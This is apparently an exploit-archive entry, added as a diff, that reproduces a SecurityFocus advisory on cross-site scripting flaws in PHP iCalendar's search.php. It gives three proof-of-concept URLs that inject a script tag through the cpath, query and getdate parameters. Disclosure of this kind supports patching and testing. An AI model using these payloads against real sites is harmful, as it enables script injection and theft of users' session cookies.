@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/21792/info
+    
+PHP icalendar is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input. 
+    
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+    
+http://www.example.com/phpicalendar/search.php?cpath=&cal=Home%2CUS%2BHolidays%2CWork &getdate=19700102&query=ss"><script>alert()</script>&submit.x=11&submit.y=15 
+
+http://www.example.com/phpicalendar/search.php?cpath="><script>alert()</script>&cal=Home %2CUS%2BHolidays%2CWork&getdate=19700102&query=ss&submit.x=11&submit.y=12 
+
+http://www.example.com/phpicalendar/search.php?cpath=&cal=Home%2CUS%2BHolidays%2CWork &getdate=19700102"><script>alert()</script>&query=ss&submit.x=11&submit.y=12
